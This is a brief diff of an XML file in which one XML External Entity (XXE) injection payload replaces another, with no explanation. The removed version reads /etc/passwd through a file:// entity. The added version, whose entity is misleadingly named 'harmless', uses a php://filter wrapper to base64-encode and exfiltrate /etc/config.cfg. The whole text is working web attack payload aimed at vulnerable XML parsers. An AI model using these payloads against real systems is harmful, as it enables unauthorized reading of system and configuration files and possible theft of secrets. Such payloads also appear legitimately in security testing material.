@@ -1,5 +1,8 @@
-<!DOCTYPE foo [  
-   <!ELEMENT foo ANY >
-   <!ENTITY xxe SYSTEM "file:///etc/passwd" >
+<!DOCTYPE results [
+    <!ENTITY harmless SYSTEM
+    "php://filter/read=convert.base64-encode/resource=/etc/config.cfg"
+    >
 ]>
-<foo>&xxe;</foo>
+<results>
+    <result>&harmless;</result>
+</results>
